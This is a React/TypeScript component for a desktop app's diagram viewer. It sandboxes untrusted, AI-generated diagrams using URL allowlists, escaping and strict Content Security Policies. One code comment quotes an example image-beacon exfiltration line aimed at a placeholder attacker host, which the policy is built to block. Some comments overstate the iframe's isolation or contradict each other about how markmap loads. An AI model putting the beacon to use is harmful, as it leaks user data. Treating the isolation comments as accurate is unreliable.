import { useEffect, useMemo } from "react";
import { openUrl } from "@tauri-apps/plugin-opener";
import { useDiagramStore, type StoredDiagram } from "../state/diagramStore";
import { useAppearance } from "../theme/AppearanceProvider";
import { IFRAME_THEMES } from "../theme/iframeTheme";
import type { AppThemeId } from "../theme/types";
import "./DiagramPanel.css";

/**
 * Diagram viewer surfaced via the Diagrams menu (⌘⇧I).
 *
 * Renders agent-produced draw.io diagrams. Native mxGraph XML is rendered
 * inline and OFFLINE using the bundled draw.io viewer (public/drawio/
 * viewer-static.min.js, v30.1.2). CSV/Mermaid have no offline viewer, so they
 * fall back to the "Open in draw.io" path.
 *
 * Security model for inline render (the XML is LLM-generated / untrusted):
 *   - It is rendered inside a sandboxed same-origin <iframe srcdoc>, isolating
 *     its DOM and lifecycle from the app.
 *   - sandbox="allow-scripts allow-same-origin" lets the viewer run but blocks
 *     top-navigation, popups, forms and modals.
 *   - The XML is injected ONLY into the data-mxgraph HTML attribute (escaped),
 *     never into a script context, and the app CSP carries no script
 *     'unsafe-inline', so injected inline handlers/scripts cannot execute.
 *   - The app CSP keeps connect-src / font-src at 'self', so the viewer's
 *     telemetry beacons (log.draw.io) and remote fonts fail closed — no data
 *     leaves the machine during inline render.
 */

const VIEWER_SRC = "/drawio/viewer-static.min.js";

// Hosts we will hand to the system browser. Everything else is refused so a
// diagram whose base_url was tampered with in the sandbox can't open an
// arbitrary/attacker origin. (Closes the Phase 1 base_url finding.)
const ALLOWED_URL_HOSTS = [
  "app.diagrams.net",
  "viewer.diagrams.net",
  "embed.diagrams.net",
  "www.draw.io",
  "draw.io",
  // Kroki renders UML/PlantUML/etc to SVG; markmap viewer is served from its
  // CDN. Both are allowed targets for the "Open externally" path and the inline
  // <img>/<iframe> render of image/markmap diagrams.
  "kroki.io",
  "markmap.js.org",
];

/** True only for an https URL pointing at a known draw.io host. */
export function isSafeDiagramUrl(raw: string): boolean {
  let u: URL;
  try {
    u = new URL(raw);
  } catch {
    return false;
  }
  if (u.protocol !== "https:") return false;
  return ALLOWED_URL_HOSTS.includes(u.hostname);
}

/** HTML-escape a value destined for a double-quoted HTML attribute. */
export function escapeHtmlAttr(s: string): string {
  return s
    .replace(/&/g, "&amp;")
    .replace(/"/g, "&quot;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/'/g, "&#39;");
}

// Strict per-document CSP applied INSIDE the srcdoc. It intersects with (and is
// stricter than) the app CSP, so even though the iframe is same-origin, the
// untrusted viewer rendering adversarial XML cannot exfiltrate embedded infra
// data: connect-src 'none' kills fetch/beacon/websocket, and img-src is pinned
// to 'self'/data: so an injected `new Image().src="https://attacker/?d=..."`
// pixel beacon fails closed (the app-wide img-src allows https:; this does not).
// 'unsafe-eval' is required (mxGraph uses eval); 'unsafe-inline' style matches
// the app and is needed for the viewer's injected stylesheets. No script
// 'unsafe-inline', so injected inline handlers/scripts still cannot run.
const IFRAME_CSP =
  "default-src 'none'; " +
  "script-src 'self' 'unsafe-eval'; " +
  "style-src 'self' 'unsafe-inline'; " +
  "img-src 'self' data:; " +
  "font-src 'self' data:; " +
  "connect-src 'none'; " +
  "frame-src 'none'; " +
  "object-src 'none'; " +
  "base-uri 'none'";

/** Build the self-contained HTML document rendered inside the iframe. */
export function buildViewerSrcDoc(xml: string, theme: AppThemeId = "terminai-dark"): string {
  const colors = IFRAME_THEMES[theme];
  const config = {
    highlight: colors.info,
    nav: true,
    resize: true,
    toolbar: "zoom layers",
    xml,
  };
  const attr = escapeHtmlAttr(JSON.stringify(config));
  // The only <script> is an external same-origin src (allowed by script-src
  // 'self'); the viewer auto-calls GraphViewer.processElements() on load.
  return `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="${escapeHtmlAttr(IFRAME_CSP)}">
<style>
  :root { --app-canvas: ${colors.canvas}; --text-primary: ${colors.text}; --status-info: ${colors.info}; --status-danger: ${colors.danger}; }
  html, body { margin: 0; padding: 0; height: 100%; background: var(--app-canvas); color: var(--text-primary); }
  .mxgraph { max-width: 100%; margin: 8px; }
</style>
</head>
<body>
<div class="mxgraph" data-mxgraph="${attr}"></div>
<script src="${VIEWER_SRC}"></script>
</body>
</html>`;
}

/**
 * True for an image source we'll render in <img>: either an inline
 * `data:image/svg+xml` URI (how Kroki SVGs arrive — no network fetch, so no
 * exfiltration vector) or an https URL on an allowed host. The app CSP pins
 * img-src to `'self' data: https:`, so a data SVG renders but cannot itself
 * load remote subresources.
 */
function isSafeImageUrl(raw: string | null): boolean {
  if (!raw) return false;
  if (raw.startsWith("data:image/svg+xml;base64,")) return true;
  return isSafeDiagramUrl(raw);
}

// markmap renders inline from LOCALLY VENDORED bundles (public/markmap/),
// mirroring the bundled draw.io viewer. Scripts are same-origin ('self'), so
// this works under the app's strict `script-src 'self'` CSP — no CDN needed.
// The markdown lives in a non-executed <script type="text/template"> block, so
// the untrusted content never enters a script context.
const MARKMAP_CSP =
  "default-src 'none'; " +
  "script-src 'self' 'unsafe-eval'; " +
  "style-src 'self' 'unsafe-inline'; " +
  "img-src 'self' data:; " +
  "font-src 'self' data:; " +
  "connect-src 'none'; " +
  "base-uri 'none'";

/** Build a self-contained markmap document; markdown lives in a text template. */
export function buildMarkmapSrcDoc(markdown: string, theme: AppThemeId = "terminai-dark"): string {
  const colors = IFRAME_THEMES[theme];
  // Escape the closing-tag sequence so the markdown cannot break out of the
  // <script type="text/template"> block; everything else is inert text.
  const safe = markdown.replace(/<\/script>/gi, "<\\/script>");
  return `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="${escapeHtmlAttr(MARKMAP_CSP)}">
<style>:root{--app-canvas:${colors.canvas};--text-primary:${colors.text};--status-danger:${colors.danger}}html,body{margin:0;padding:0;height:100%;background:var(--app-canvas);color:var(--text-primary)}#markmap-svg{width:100%;height:100vh}#markmap-error{color:var(--status-danger);font-family:sans-serif;padding:8px}</style>
</head>
<body>
<script type="text/template" id="markmap-source">${safe}</script>
<svg id="markmap-svg"></svg>
<div id="markmap-error"></div>
<script src="/markmap/d3.min.js"></script>
<script src="/markmap/markmap-view.js"></script>
<script src="/markmap/markmap-lib.js"></script>
<script src="/markmap/markmap-init.js"></script>
</body>
</html>`;
}

function DiagramView({ diagram }: { diagram: StoredDiagram }) {
  const { settings } = useAppearance();
  const canRenderInline = diagram.format === "xml" && !!diagram.xml;
  // Kroki SVG (format "image") renders as a plain <img> from an allowed host;
  // markmap renders its markdown (in diagram.source) via a CDN autoloader in a
  // sandboxed iframe.
  const isImage = diagram.format === "image" && isSafeImageUrl(diagram.imageUrl);
  const isMarkmap = diagram.format === "markmap" && !!diagram.source;

  const srcDoc = useMemo(() => {
    if (canRenderInline) return buildViewerSrcDoc(diagram.xml as string, settings.appTheme);
    if (isMarkmap) return buildMarkmapSrcDoc(diagram.source as string, settings.appTheme);
    return "";
  }, [canRenderInline, isMarkmap, diagram.xml, diagram.source, settings.appTheme]);

  const openInBrowser = async () => {
    if (!isSafeDiagramUrl(diagram.url)) {
      // Refuse to hand an untrusted/non-draw.io URL to the OS browser.
      // eslint-disable-next-line no-console
      console.error("[DiagramPanel] refusing to open unsafe URL:", diagram.url);
      return;
    }
    try {
      await openUrl(diagram.url);
    } catch (e) {
      // eslint-disable-next-line no-console
      console.error("[DiagramPanel] failed to open url:", e);
    }
  };

  const openDisabled = !isSafeDiagramUrl(diagram.url);
  const openLabel = canRenderInline ? "Open in draw.io" : "Open externally";

  return (
    <div className="diagram-view" data-testid="diagram-view">
      <div className="diagram-view-header">
        <span className="diagram-view-title">{diagram.title}</span>
        <span className="diagram-view-format">{diagram.format}</span>
        <button
          className="diagram-open-btn"
          onClick={openInBrowser}
          disabled={openDisabled}
          title={openDisabled ? "URL is not a recognized address" : openLabel}
        >
          {openLabel}
        </button>
      </div>

      {canRenderInline || isMarkmap ? (
        <iframe
          className="diagram-view-frame"
          title={`diagram-${diagram.id}`}
          // Isolate untrusted content: scripts allowed (viewer needs them) but
          // no top-navigation, popups, forms or modals.
          sandbox="allow-scripts allow-same-origin"
          srcDoc={srcDoc}
          data-testid="diagram-iframe"
        />
      ) : isImage ? (
        // Kroki-rendered SVG: a plain <img> from an allowed host. The app CSP
        // (img-src) and the host allowlist keep this from loading arbitrary
        // origins.
        <div className="diagram-view-image" data-testid="diagram-image">
          <img
            src={diagram.imageUrl as string}
            alt={diagram.title}
            className="diagram-view-img"
          />
        </div>
      ) : (
        <div className="diagram-view-fallback" data-testid="diagram-fallback">
          <p>
            Inline preview is available for draw.io XML, rendered images and
            mind-maps. This <strong>{diagram.format}</strong> diagram opens
            externally.
          </p>
          <button
            className="diagram-open-btn"
            onClick={openInBrowser}
            disabled={openDisabled}
          >
            {openLabel}
          </button>
        </div>
      )}
    </div>
  );
}

export function DiagramPanel() {
  const diagrams = useDiagramStore((s) => s.diagrams);
  const selectedId = useDiagramStore((s) => s.selectedId);
  const select = useDiagramStore((s) => s.select);
  const clear = useDiagramStore((s) => s.clear);
  const loadSaved = useDiagramStore((s) => s.loadSaved);
  const remove = useDiagramStore((s) => s.remove);

  // Hydrate persisted diagrams whenever the panel mounts so saved diagrams
  // (including ones from prior sessions) show up in the list.
  useEffect(() => {
    void loadSaved();
  }, [loadSaved]);

  const selected =
    diagrams.find((d) => d.id === selectedId) ?? diagrams[0] ?? null;

  return (
    <div className="diagram-panel" data-testid="diagram-panel">
      <aside className="diagram-panel-list">
        <div className="diagram-panel-list-header">
          <span>Diagrams</span>
          {diagrams.length > 0 && (
            <button className="diagram-clear-btn" onClick={clear}>
              Clear
            </button>
          )}
        </div>
        {diagrams.length === 0 ? (
          <div className="diagram-panel-empty">
            No diagrams yet. Ask an agent to draw a topology — diagrams appear
            here.
          </div>
        ) : (
          <ul className="diagram-panel-items">
            {diagrams.map((d) => (
              <li
                key={d.id}
                className={
                  "diagram-panel-item" +
                  (selected?.id === d.id ? " is-selected" : "")
                }
                onClick={() => select(d.id)}
              >
                <span className="diagram-item-title">{d.title}</span>
                <span className="diagram-item-format">{d.format}</span>
                <button
                  className="diagram-item-delete"
                  title="Delete diagram"
                  onClick={(e) => {
                    e.stopPropagation();
                    remove(d.id);
                  }}
                >
                  ×
                </button>
              </li>
            ))}
          </ul>
        )}
      </aside>

      <section className="diagram-panel-main">
        {selected ? (
          <DiagramView diagram={selected} />
        ) : (
          <div className="diagram-panel-placeholder">
            Diagrams produced by agents will render here.
          </div>
        )}
      </section>
    </div>
  );
}
